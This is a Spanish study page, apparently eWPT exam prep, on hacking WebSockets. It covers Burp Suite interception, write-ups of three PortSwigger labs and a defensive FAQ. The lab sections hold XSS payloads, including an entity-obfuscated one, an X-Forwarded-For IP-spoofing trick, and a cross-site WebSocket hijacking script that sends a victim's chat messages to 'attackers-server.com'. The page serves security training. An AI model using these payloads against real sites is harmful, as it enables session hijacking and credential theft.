dark:underline-neutral-600" href=/preparacion-ewpt/web_socket/>Hacking Web Socket</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-5 text-4xl font-extrabold text-neutral-900 dark:text-neutral">Hacking Web Socket</h1><div class="mt-1 mb-2 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"></div></div><script type=text/javascript src=/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_preparacion-ewpt/web_socket/_index.md data-oid-likes=likes_preparacion-ewpt/web_socket/_index.md></script></header><section class="mt-0 prose flex max-w-full flex-col dark:prose-invert lg:flex-row"><div class="min-w-0 min-h-0 max-w-prose"><h1 class="relative group">Hacking Web Socket<div id=hacking-web-socket class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#hacking-web-socket aria-label=Ancla>#</a></span></h1><h2 class="relative group">Definici√≥n y Ejemplos<div id=definici√≥n-y-ejemplos class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#definici%c3%b3n-y-ejemplos aria-label=Ancla>#</a></span></h2><p>Los WebSockets son un protocolo de comunicaci√≥n bidireccional que proporciona un canal de comunicaci√≥n persistente entre un cliente y un servidor sobre una √∫nica conexi√≥n TCP. A diferencia de HTTP, que sigue un modelo de solicitud-respuesta, WebSockets permiten una comunicaci√≥n full-duplex donde tanto el cliente como el servidor pueden enviar mensajes independientemente en cualquier momento.</p><p><strong>Caracter√≠sticas principales:</strong></p><ul><li>Conexi√≥n persistente (no es necesario reconectar)</li><li>Comunicaci√≥n bidireccional en tiempo real</li><li>Menor overhead de datos comparado con polling HTTP</li><li>Utiliza el protocolo <code>ws://</code> o <code>wss://</code> (WebSocket seguro)</li></ul><p><strong>Ejemplo de establecimiento de conexi√≥n WebSocket en JavaScript:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// Crear una conexi√≥n WebSocket
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>socket</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebSocket</span><span class=p>(</span><span class=s1>&#39;wss://ejemplo.com/socket&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Eventos para manejar la conexi√≥n
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>socket</span><span class=p>.</span><span class=nx>onopen</span> <span class=o>=</span> <span class=kd>function</span><span class=p>(</span><span class=nx>event</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;Conexi√≥n establecida&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>socket</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s1>&#39;Hola servidor!&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>socket</span><span class=p>.</span><span class=nx>onmessage</span> <span class=o>=</span> <span class=kd>function</span><span class=p>(</span><span class=nx>event</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;Mensaje recibido:&#39;</span><span class=p>,</span> <span class=nx>event</span><span class=p>.</span><span class=nx>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>socket</span><span class=p>.</span><span class=nx>onclose</span> <span class=o>=</span> <span class=kd>function</span><span class=p>(</span><span class=nx>event</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;Conexi√≥n cerrada&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>socket</span><span class=p>.</span><span class=nx>onerror</span> <span class=o>=</span> <span class=kd>function</span><span class=p>(</span><span class=nx>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;Error:&#39;</span><span class=p>,</span> <span class=nx>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><h2 class="relative group">Uso de Burp Suite para Pruebas en WebSockets<div id=uso-de-burp-suite-para-pruebas-en-websockets class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#uso-de-burp-suite-para-pruebas-en-websockets aria-label=Ancla>#</a></span></h2><p>Burp Suite es una herramienta esencial para probar la seguridad de aplicaciones que utilizan WebSockets. Permite interceptar, inspeccionar y modificar los mensajes que se intercambian entre el cliente y el servidor.</p><h3 class="relative group">Configuraci√≥n b√°sica:<div id=configuraci√≥n-b√°sica class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#configuraci%c3%b3n-b%c3%a1sica aria-label=Ancla>#</a></span></h3><ol><li><p><strong>Configuraci√≥n del navegador:</strong> Aseg√∫rate de que tu navegador est√© configurado para usar Burp Suite como proxy (generalmente 127.0.0.1:8080).</p></li><li><p><strong>Interceptaci√≥n de WebSockets:</strong></p><ul><li>Ve a la pesta√±a &ldquo;Proxy&rdquo; > &ldquo;Intercept&rdquo; y activa la opci√≥n &ldquo;Intercept is on&rdquo;</li><li>Para ver las conexiones WebSocket activas, dir√≠gete a &ldquo;Proxy&rdquo; > &ldquo;WebSockets history&rdquo;</li></ul></li><li><p><strong>Manipulaci√≥n de mensajes:</strong></p><ul><li>Puedes modificar mensajes en tiempo real desde la pesta√±a &ldquo;Intercept&rdquo;</li><li>Tambi√©n puedes enviar mensajes a otras herramientas de Burp (Repeater, Intruder, etc.)</li></ul></li><li><p><strong>Uso de WebSocket Repeater:</strong></p><ul><li>Env√≠a cualquier mensaje WebSocket al Repeater para modificarlo y reenviarlo</li><li>Permite probar diferentes payloads y observar respuestas sin necesidad de interactuar con la aplicaci√≥n web</li></ul></li></ol><h3 class="relative group">Ejemplo de modificaci√≥n de mensaje en Burp:<div id=ejemplo-de-modificaci√≥n-de-mensaje-en-burp class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#ejemplo-de-modificaci%c3%b3n-de-mensaje-en-burp aria-label=Ancla>#</a></span></h3><ol><li>Intercepta un mensaje WebSocket</li><li>Modifica el contenido (por ejemplo, a√±adiendo una carga XSS)</li><li>Haz clic en &ldquo;Forward&rdquo; para enviar el mensaje modificado al servidor</li></ol><h2 class="relative group">Vulnerabilidades y Ataques Comunes<div id=vulnerabilidades-y-ataques-comunes class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#vulnerabilidades-y-ataques-comunes aria-label=Ancla>#</a></span></h2><h3 class="relative group">Manipulaci√≥n de Mensajes WebSocket<div id=manipulaci√≥n-de-mensajes-websocket class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#manipulaci%c3%b3n-de-mensajes-websocket aria-label=Ancla>#</a></span></h3><p>En este laboratorio de PortSwigger se demuestra c√≥mo se puede abusar del canal de comunicaci√≥n WebSocket para introducir cargas maliciosas que no pasan por los filtros del navegador.</p><p>La aplicaci√≥n cuenta con un chat en tiempo real gestionado por WebSockets. Al enviar un mensaje desde el navegador, observamos que el cliente aplica una codificaci√≥n autom√°tica para evitar ataques. Sin embargo, al interceptar el mensaje desde una herramienta como Burp y modificarlo manualmente antes de que llegue al servidor, conseguimos insertar una carga que, al ser procesada por el navegador del agente de soporte, genera una ejecuci√≥n no deseada.</p><p>Esta t√©cnica pone de manifiesto la importancia de validar los mensajes en el servidor, ya que las protecciones del cliente pueden ser f√°cilmente eludidas. El laboratorio se completa cuando logramos que la carga manipulada sea procesada por el navegador del agente, confirmando la existencia de la vulnerabilidad.</p><h4 class="relative group">Paso a paso para explotar:<div id=paso-a-paso-para-explotar class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#paso-a-paso-para-explotar aria-label=Ancla>#</a></span></h4><ol><li>Interceptar el mensaje WebSocket con Burp Suite</li><li>Modificar el contenido para incluir una carga XSS: <code>&lt;img src=x onerror='alert(1)'></code></li><li>Enviar el mensaje modificado al servidor</li><li>El agente de soporte recibe el mensaje y la carga XSS se ejecuta en su navegador</li></ol><h3 class="relative group">Secuestro de WebSocket entre Sitios (Cross-Site WebSocket Hijacking)<div id=secuestro-de-websocket-entre-sitios-cross-site-websocket-hijacking class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#secuestro-de-websocket-entre-sitios-cross-site-websocket-hijacking aria-label=Ancla>#</a></span></h3><p>Este laboratorio presenta un escenario en el que un canal WebSocket se encuentra mal protegido, permitiendo que un atacante pueda establecer una conexi√≥n maliciosa desde otro dominio y extraer informaci√≥n sensible.</p><p>La aplicaci√≥n incorpora un sistema de chat que utiliza WebSockets para gestionar la comunicaci√≥n. Analizando la interacci√≥n con el servidor, identificamos que no existen medidas de protecci√≥n contra peticiones cruzadas (como tokens CSRF o validaci√≥n de origen), lo que abre la puerta a un ataque de tipo cross-site WebSocket hijacking.</p><p>El atacante construye un payload malicioso en una p√°gina controlada, capaz de establecer la conexi√≥n WebSocket directamente con el servidor del chat. Desde ah√≠, simula el comportamiento leg√≠timo del cliente, solicitando el historial de conversaci√≥n. Una vez recuperados los mensajes, estos se reenv√≠an a un servidor externo (como Burp Collaborator) para su an√°lisis.</p><h4 class="relative group">Ejemplo de exploit para CSWSH:<div id=ejemplo-de-exploit-para-cswsh class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#ejemplo-de-exploit-para-cswsh aria-label=Ancla>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>socket</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebSocket</span><span class=p>(</span><span class=s1>&#39;wss://vulnerable-site.com/chat&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=nx>socket</span><span class=p>.</span><span class=nx>onopen</span> <span class=o>=</span> <span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>socket</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s1>&#39;READY&#39;</span><span class=p>);</span>  <span class=c1>// Iniciar la conexi√≥n
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>};</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=nx>socket</span><span class=p>.</span><span class=nx>onmessage</span> <span class=o>=</span> <span class=kd>function</span><span class=p>(</span><span class=nx>event</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;https://attackers-server.com/collect?data=&#39;</span> <span class=o>+</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>event</span><span class=p>.</span><span class=nx>data</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>El laboratorio se resuelve cuando logramos obtener, entre los mensajes de la v√≠ctima, sus credenciales de acceso, y las usamos para iniciar sesi√≥n en su cuenta. Esto demuestra c√≥mo una falta de validaciones en el establecimiento de conexiones WebSocket puede comprometer la seguridad de los usuarios.</p><h3 class="relative group">Manipulaci√≥n del Handshake de WebSocket<div id=manipulaci√≥n-del-handshake-de-websocket class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#manipulaci%c3%b3n-del-handshake-de-websocket aria-label=Ancla>#</a></span></h3><p>Este laboratorio presenta un escenario en el que una tienda online utiliza WebSockets para su sistema de chat en tiempo real. Sin embargo, la implementaci√≥n contiene una l√≥gica de filtrado de XSS defectuosa que puede ser sorteada con t√©cnicas de evasi√≥n.</p><p>Durante la interacci√≥n con el chat, se descubre que al enviar una carga maliciosa cl√°sica, la conexi√≥n WebSocket se termina inmediatamente y el servidor bloquea la IP del cliente. Sin embargo, este mecanismo puede ser eludido modificando la cabecera del handshake para falsificar la direcci√≥n IP mediante un encabezado espec√≠fico.</p><p>Una vez restablecida la conexi√≥n usando esta t√©cnica, se puede enviar una versi√≥n ofuscada de una carga XSS que pasa por alto el filtro del servidor. Dicha carga es ejecutada por el navegador del agente de soporte, resolviendo as√≠ el laboratorio al provocar la ejecuci√≥n de un &lsquo;<strong>alert()</strong>&rsquo;.</p><h4 class="relative group">T√©cnica de explotaci√≥n:<div id=t√©cnica-de-explotaci√≥n class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#t%c3%a9cnica-de-explotaci%c3%b3n aria-label=Ancla>#</a></span></h4><ol><li>Intenta enviar una carga XSS b√°sica y observa el bloqueo</li><li>Modifica el handshake WebSocket para incluir una cabecera que falsifique tu IP:<pre tabindex=0><code>X-Forwarded-For: 127.0.0.1
</code></pre></li><li>Env√≠a una carga XSS ofuscada para evadir los filtros:<pre tabindex=0><code>&lt;img src=1 onerror=&#34;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;(1)&#34;&gt;
</code></pre></li></ol><p>Este ejercicio demuestra c√≥mo una mala validaci√≥n en el establecimiento de conexiones WebSocket puede ser explotada para evadir mecanismos de protecci√≥n y ejecutar ataques del lado del cliente.</p><h2 class="relative group">Preguntas Frecuentes<div id=preguntas-frecuentes class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#preguntas-frecuentes aria-label=Ancla>#</a></span></h2><h3 class="relative group">1. ¬øQu√© riesgo existe si no se valida correctamente el contenido de los mensajes WebSocket?<div id=1-qu√©-riesgo-existe-si-no-se-valida-correctamente-el-contenido-de-los-mensajes-websocket class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#1-qu%c3%a9-riesgo-existe-si-no-se-valida-correctamente-el-contenido-de-los-mensajes-websocket aria-label=Ancla>#</a></span></h3><p>La falta de validaci√≥n adecuada en los mensajes WebSocket puede permitir la inyecci√≥n de contenido malicioso como scripts XSS, comandos SQL o datos malformados. Al no implementar filtros de seguridad en el servidor, los atacantes pueden eludir las protecciones del lado del cliente e introducir cargas que pueden conducir a:</p><ul><li>Ejecuci√≥n de c√≥digo en el navegador de otros usuarios</li><li>Robo de sesiones o datos sensibles</li><li>Manipulaci√≥n de la interfaz de usuario</li><li>Propagaci√≥n de ataques a otros usuarios de la aplicaci√≥n</li></ul><p>Es crucial implementar validaci√≥n tanto en el cliente como en el servidor para mitigar estos riesgos.</p><h3 class="relative group">2. ¬øQu√© componente se puede manipular en el handshake del WebSocket?<div id=2-qu√©-componente-se-puede-manipular-en-el-handshake-del-websocket class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#2-qu%c3%a9-componente-se-puede-manipular-en-el-handshake-del-websocket aria-label=Ancla>#</a></span></h3><p>Durante el handshake de WebSocket (la negociaci√≥n inicial de la conexi√≥n), varios componentes pueden ser manipulados:</p><ul><li><strong>Cabeceras HTTP</strong>: Como <code>Origin</code>, <code>Cookie</code>, <code>X-Forwarded-For</code>, <code>User-Agent</code></li><li><strong>Par√°metros de consulta URL</strong>: Tokens de autenticaci√≥n o par√°metros de sesi√≥n</li><li><strong>Protocolos WebSocket</strong>: Mediante la cabecera <code>Sec-WebSocket-Protocol</code></li><li><strong>Extensiones WebSocket</strong>: Mediante la cabecera <code>Sec-WebSocket-Extensions</code></li></ul><p>Estas manipulaciones pueden permitir evasi√≥n de restricciones, bypass de validaciones IP o suplantaci√≥n de identidad.</p><h3 class="relative group">3. ¬øQu√© permite el secuestro de WebSocket entre sitios?<div id=3-qu√©-permite-el-secuestro-de-websocket-entre-sitios class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#3-qu%c3%a9-permite-el-secuestro-de-websocket-entre-sitios aria-label=Ancla>#</a></span></h3><p>El secuestro de WebSocket entre sitios (Cross-Site WebSocket Hijacking o CSWSH) permite a un atacante:</p><ul><li>Establecer conexiones WebSocket no autorizadas desde un dominio malicioso</li><li>Explotar la falta de protecci√≥n CSRF en el handshake WebSocket</li><li>Acceder a informaci√≥n sensible del usuario autenticado</li><li>Realizar acciones en nombre del usuario sin su conocimiento</li><li>Extraer datos de comunicaciones privadas o chats</li><li>Reutilizar las cookies de autenticaci√≥n de la v√≠ctima para establecer conexiones leg√≠timas</li></ul><p>Es especialmente peligroso porque aprovecha las sesiones activas del usuario y permite una exfiltraci√≥n de datos en tiempo real.</p><h3 class="relative group">4. ¬øQu√© medida previene accesos desde otros sitios?<div id=4-qu√©-medida-previene-accesos-desde-otros-sitios class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#4-qu%c3%a9-medida-previene-accesos-desde-otros-sitios aria-label=Ancla>#</a></span></h3><p>Para prevenir accesos WebSocket desde sitios no autorizados se pueden implementar:</p><ul><li><strong>Validaci√≥n del encabezado Origin</strong>: Verificar que la petici√≥n proviene de un dominio autorizado</li><li><strong>Tokens anti-CSRF</strong>: Incluir tokens √∫nicos en la URL o en los par√°metros del WebSocket</li><li><strong>Tokens de autenticaci√≥n espec√≠ficos para WebSocket</strong>: Diferentes de las cookies de sesi√≥n</li><li><strong>Same-Site Cookies</strong>: Configurar cookies con atributo SameSite=Strict</li><li><strong>CORS adecuado</strong>: Configurar correctamente las pol√≠ticas de origen cruzado</li><li><strong>Validaci√≥n de estado y secuencia</strong>: Verificar que la conexi√≥n sigue un flujo l√≥gico esperado</li></ul><p>La combinaci√≥n de estas t√©cnicas dificulta significativamente los ataques CSWSH.</p><h3 class="relative group">5. ¬øCu√°l es el prop√≥sito principal de un WebSocket?<div id=5-cu√°l-es-el-prop√≥sito-principal-de-un-websocket class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#5-cu%c3%a1l-es-el-prop%c3%b3sito-principal-de-un-websocket aria-label=Ancla>#</a></span></h3><p>El prop√≥sito principal de WebSocket es proporcionar un canal de comunicaci√≥n bidireccional, persistente y de baja latencia entre un cliente y un servidor. Sus objetivos fundamentales son:</p><ul><li>Facilitar la comunicaci√≥n en tiempo real sin necesidad de polling continuo</li><li>Reducir la sobrecarga de datos al eliminar cabeceras HTTP repetitivas</li><li>Permitir que el servidor env√≠e datos al cliente sin necesidad de solicitud previa</li><li>Mantener una √∫nica conexi√≥n TCP para m√∫ltiples intercambios de mensajes</li><li>Soportar aplicaciones interactivas como chats, juegos en l√≠nea, paneles de datos en tiempo real y notificaciones instant√°neas</li></ul><p>WebSocket llena el vac√≠o que exist√≠a en las comunicaciones web tradicionales, permitiendo experiencias verdaderamente interactivas y en tiempo real.</p><hr><blockquote><p><em>Josfull ‚Äî Creador, escritor y pentester detr√°s de cada l√≠nea de este sitio.</em></p></blockquote></div></section><section class="mt-10 prose dark:prose-invert"><p class="py-8 border-t"><em>A√∫n no hay art√≠culos para listar aqu√≠.</em></p></section><div id=top-scroller class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Ir arriba" title="Ir arriba">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex flex-col list-none sm:flex-row"><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/herramientas/ title=Herramientas>Herramientas</a></li><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/authors/ title="Sobre el Autor">Autor</a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
Josfull</p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.62060bb247f4de2b6dde45903668fefb68d792f365587605177b1227c0cf43588701edaca0cb40e2c8e2789bd5ce67c1d2a215b9fb258c3496a7cd25e7cb5fdf.js integrity="sha512-YgYLskf03itt3kWQNmj++2jXkvNlWHYFF3sSJ8DPQ1iHAe2soMtA4sjieJvVzmfB0qIVufsljDSWp80l58tf3w=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://localhost:1313><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Buscar tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Cerrar (Esc)">
<span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>